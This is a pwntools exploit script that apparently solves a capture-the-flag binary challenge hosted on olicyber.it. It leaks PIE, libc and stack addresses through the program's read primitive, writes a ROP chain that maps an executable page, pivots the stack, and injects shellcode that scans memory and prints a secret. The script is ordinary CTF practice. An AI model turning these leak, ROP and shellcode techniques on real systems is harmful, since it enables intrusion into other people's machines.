from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = exe

HOST = "2pac.challs.olicyber.it"
PORT = 21017

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
# args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

STACK = 0x0

def extract_ptr(ptr):
    return ptr & 0x7fffffffffff

def leak_pie_base(r):
    r.sendlineafter(b"> ", b"5")
    addr = int(r.recvuntil(b"Main").decode().split()[-2][2:], 16)

    exe.address = extract_ptr(addr) - exe.symbols.primality_test
    log.success(f"LEAKED PIE BASE: {hex(exe.address)}")

def leak_libc(r):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"pointer: ", hex(exe.got.puts)[2:].encode())

    libc.address = int.from_bytes(r.recvline()[:8], "little") - libc.symbols.puts
    log.success(f"LEAKED LIBC: {hex(libc.address)}")

def leak_stack(r):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"pointer: ", hex(libc.symbols.environ)[2:].encode())

    global STACK
    STACK = int.from_bytes(r.recvline()[:8], "little")

    log.success(f"LEAKED STACK: {hex(STACK)}")

def get_page(r):
    r.sendlineafter(b"> ", b"1")
    r.recvuntil(b"at ")

    page = extract_ptr(int(r.recvline().decode().strip()[2:], 16))
    log.success(f"ROP STACK IS AT {hex(page)}")
    return page
    
def find_rip(r):
    """
    for i in range(0, 0x2100, 16):
        r.sendlineafter(b"> ", b"3")
        r.sendlineafter(b"pointer: ", hex(STACK - i)[2:].encode())

        line = r.recvline()
        rip = int.from_bytes(line[:8], "little")
        if rip == exe.symbols.mainMenu + 0x12a:
            log.success(f"FOUND OFFSET: {hex(i)}")
            return i

        rip = int.from_bytes(line[9:], "little")
        if rip == exe.symbols.mainMenu + 0x12a:
            log.success(f"FOUND OFFSET: {hex(i)}")
            return i + 8

    log.critical(f"OFFSET NOT FOUND")
    return 0
    """
    return 0x170
    
FLAGS = 34
MMAP = 9
PAGE_SIZE = 0x1000
PROT = 7
SHELLCODE_ADDR = 0x13370000

JUMP_RAX = 0x2a147

def write_rop_chain(r, addr):
    rop = ROP(libc)
    rop.call("mmap", [SHELLCODE_ADDR, PAGE_SIZE, PROT, FLAGS])
    rop.call("read", [0, SHELLCODE_ADDR, PAGE_SIZE])
    
    rop.rax = SHELLCODE_ADDR
    
    rop_chain = rop.chain() + pack(JUMP_RAX + libc.address)
    
    for i in range(0, len(rop_chain), 16):
        r.sendlineafter(b"> ", b"2")
        r.sendlineafter(b"pointer: ", hex(addr + i)[2:].encode())
        r.sendafter(b"Text: ", rop_chain[i:i+16])

def stackpivot(r, offset, addr):
    rop = ROP(libc)
    rop.rsp = addr
    
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"pointer: ", hex(STACK - offset)[2:].encode())
    r.sendafter(b"Text: ", rop.chain())
    
def write_shellcode(r):
    shellcode = asm("""
    mov rdi, 0x7ffff6fff000
    
    .loop:
    add rdi, 0x1000
    mov rax, 0x0a
    mov rsi, 0x1000
    mov rdx, 1
    syscall
    xor rbx, rbx
    cmp rax, rbx
    je .done
    jmp .loop
    
    .done:
    mov rsi, rdi
    mov rdi, 1
    mov rdx, 0x3a
    mov rax, 1
    syscall

    .exit:
    mov rdi, 1
    mov rax, 0x3c
    syscall
    """)
    
    r.sendline(shellcode)
    
def main():
    r = conn()

    leak_pie_base(r)
    leak_libc(r)
    leak_stack(r)

    addr = get_page(r)
    
    write_rop_chain(r, addr)
    offset = find_rip(r)
    stackpivot(r, offset, addr)

    write_shellcode(r)
    r.interactive()
    
if __name__ == "__main__":
    main()
